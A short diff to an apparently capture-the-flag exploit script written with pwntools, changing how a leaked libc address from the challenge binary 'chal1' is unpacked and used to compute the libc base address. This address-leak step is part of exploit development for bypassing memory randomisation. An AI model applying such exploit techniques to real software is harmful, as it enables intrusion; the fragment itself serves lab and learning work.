@@ -24,11 +24,11 @@ with gdb.debug("./chal1", gdbscript=gdbscript) as conn:
     # "Here is your substring:"
     print(conn.recvline())
     # The resulting substring is a sequence of raw bytes that is
-    # the 8-byte representation of the leaked address. We use GDB
+    # the byte representation of the leaked address. We use GDB
     # to find the base address (first address) of libc and compute
     # the offset from the leaked address to the libc base.
     line = conn.recvline(keepends=False)
-    libc_leak_addr = int.from_bytes(line, "little")
+    libc_leak_addr = unpack(line, "all")
     libc_base_addr = libc_leak_addr - 0x7ffff7e1b6a0 + 0x7ffff7c00000
     print(f"libc_base_addr {hex(libc_base_addr)}")
 
